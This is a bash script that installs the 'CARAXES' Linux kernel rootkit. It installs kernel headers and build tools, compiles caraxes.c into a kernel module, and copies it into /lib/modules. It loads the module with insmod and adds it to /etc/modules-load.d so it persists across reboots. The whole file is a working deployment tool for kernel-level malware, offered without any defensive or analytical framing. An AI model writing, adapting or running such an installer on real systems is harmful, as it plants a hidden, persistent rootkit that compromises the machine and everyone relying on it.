#!/bin/bash

# CARAXES Rootkit Installation Script
# This script installs necessary dependencies and compiles the rootkit

set -e  # Exit on any error

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to print colored output
print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Function to detect Linux distribution
detect_distro() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        DISTRO=$ID
        VERSION=$VERSION_ID
    elif [ -f /etc/redhat-release ]; then
        DISTRO="rhel"
    elif [ -f /etc/debian_version ]; then
        DISTRO="debian"
    else
        DISTRO="unknown"
    fi
    
    print_status "Detected distribution: $DISTRO"
}

# Function to install dependencies based on distribution
install_dependencies() {
    print_status "Installing kernel headers and build dependencies..."
    
    case $DISTRO in
        "ubuntu"|"debian")
            print_status "Installing dependencies for Debian/Ubuntu..."
            sudo apt update
            sudo apt install -y \
                linux-headers-$(uname -r) \
                build-essential \
                make \
                gcc \
                git \
                kmod
            ;;
        "fedora"|"rhel"|"centos"|"rocky"|"almalinux")
            print_status "Installing dependencies for RHEL/Fedora/CentOS..."
            if command -v dnf &> /dev/null; then
                sudo dnf install -y \
                    kernel-headers-$(uname -r) \
                    kernel-devel-$(uname -r) \
                    gcc \
                    make \
                    git \
                    kmod
            else
                sudo yum install -y \
                    kernel-headers-$(uname -r) \
                    kernel-devel-$(uname -r) \
                    gcc \
                    make \
                    git \
                    kmod
            fi
            ;;
        "arch"|"manjaro")
            print_status "Installing dependencies for Arch Linux..."
            sudo pacman -S --needed \
                linux-headers \
                base-devel \
                git \
                kmod
            ;;
        "opensuse"|"sles")
            print_status "Installing dependencies for openSUSE..."
            sudo zypper install -y \
                kernel-default-devel \
                gcc \
                make \
                git \
                kmod
            ;;
        *)
            print_warning "Unknown distribution. Please install the following manually:"
            echo "  - Kernel headers for $(uname -r)"
            echo "  - build-essential/gcc/make"
            echo "  - git"
            echo "  - kmod"
            read -p "Press Enter to continue after installing dependencies..."
            ;;
    esac
}

# Function to check if kernel headers are properly installed
check_kernel_headers() {
    print_status "Checking kernel headers..."
    
    KERNEL_VERSION=$(uname -r)
    HEADERS_PATH="/lib/modules/$KERNEL_VERSION/build"
    
    if [ ! -d "$HEADERS_PATH" ]; then
        print_error "Kernel headers not found at $HEADERS_PATH"
        print_error "Please install kernel headers for your current kernel: $KERNEL_VERSION"
        exit 1
    fi
    
    if [ ! -f "$HEADERS_PATH/Makefile" ]; then
        print_error "Kernel headers appear to be incomplete (no Makefile found)"
        exit 1
    fi
    
    print_success "Kernel headers found and appear to be complete"
}

# Function to check if we're running as root for module operations
check_root_for_module() {
    if [ "$EUID" -eq 0 ]; then
        print_warning "Running as root. This is required for loading/unloading kernel modules."
        return 0
    else
        print_warning "Not running as root. You'll need sudo privileges to load/unload the module."
        return 1
    fi
}

# Function to clean previous builds
clean_build() {
    print_status "Cleaning previous builds..."
    if [ -f "Makefile" ]; then
        make clean 2>/dev/null || true
    fi
    rm -f *.ko *.o *.mod.c *.mod *.symvers *.order .*.cmd 2>/dev/null || true
    rm -rf .tmp_versions/ 2>/dev/null || true
}

# Function to compile the rootkit
compile_rootkit() {
    print_status "Compiling CARAXES rootkit..."
    
    if [ ! -f "Makefile" ]; then
        print_error "Makefile not found in current directory"
        exit 1
    fi
    
    if [ ! -f "caraxes.c" ]; then
        print_error "caraxes.c not found in current directory"
        exit 1
    fi
    
    # Compile
    make
    
    if [ -f "caraxes.ko" ]; then
        print_success "Compilation successful! caraxes.ko created."
    else
        print_error "Compilation failed. caraxes.ko not found."
        exit 1
    fi
}

# Function to install module to system location
install_module_system() {
    print_status "Installing module to system location..."
    
    CURRENT_DIR=$(pwd)
    
    # Create directory structure and install module
    if sudo mkdir -p /lib/modules/$(uname -r)/kernel/drivers/caraxes; then
        print_success "Created module directory"
    else
        print_error "Failed to create module directory"
        exit 1
    fi

    # Copy module to system location
    if sudo cp "$CURRENT_DIR/caraxes.ko" /lib/modules/$(uname -r)/kernel/drivers/caraxes/; then
        print_success "Module copied to system directory"
    else
        print_error "Failed to copy module"
        exit 1
    fi

    # Check if module is already loaded and remove it
    if lsmod | grep -q caraxes; then
        print_warning "Module already loaded, removing it first..."
        sudo rmmod caraxes || true
    fi

    # Load the module
    if sudo insmod /lib/modules/$(uname -r)/kernel/drivers/caraxes/caraxes.ko; then
        print_success "Module loaded successfully"
    else
        print_error "Failed to load module"
        print_warning "Try manually removing conflicting modules with: sudo rmmod <module_name>"
        exit 1
    fi

    # Update module dependencies
    print_status "Updating module dependencies..."
    sudo depmod -a

    # Add to auto-load configuration
    print_status "Configuring auto-load..."
    echo "caraxes" | sudo tee /etc/modules-load.d/caraxes.conf > /dev/null

    # Load with modprobe
    if sudo modprobe caraxes; then
        print_success "Module configured for auto-load"
    else
        print_warning "Module already loaded"
    fi

    echo
    print_success "Installation completed successfully!"

    # Verify module is loaded
    print_status "Verifying module is loaded..."
    if lsmod | grep -q caraxes; then
        print_success "Module is now active and will auto-load on boot"
    else
        print_warning "Warning: Module may not be loaded properly"
    fi
}



# Check if we're in the right directory
if [ ! -f "caraxes.c" ] || [ ! -f "Makefile" ]; then
    print_error "Please run this script from the CARAXES rootkit directory"
    print_error "Required files: caraxes.c, Makefile"
    exit 1
fi

# Detect distribution
detect_distro

# Install dependencies
install_dependencies

# Check kernel headers
check_kernel_headers

# Check root privileges
check_root_for_module

# Clean previous builds
clean_build

# Compile the rootkit
compile_rootkit

# Install module to system location
install_module_system
